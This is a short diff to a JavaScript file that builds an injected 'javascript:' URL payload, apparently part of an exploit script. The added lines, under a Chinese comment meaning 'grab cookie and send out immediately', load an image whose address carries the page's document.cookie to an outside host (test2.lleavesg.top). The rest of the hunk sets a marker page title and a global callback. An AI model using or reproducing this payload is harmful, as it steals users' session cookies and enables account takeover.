@@ -17,6 +17,9 @@ var js =
 'javascript:void(' +
   'document.title="RACE_SI_OK",' +
 
+  // ---- 拿 cookie 立即外传 ----
+  'new Image().src="https://test2.lleavesg.top/cookie?c="+encodeURIComponent(document.cookie),' +
+
   // ---- 基础 savePicCallback（全局兜底）----
   'window.savePicCallback=function(a){' +
     'try{' +
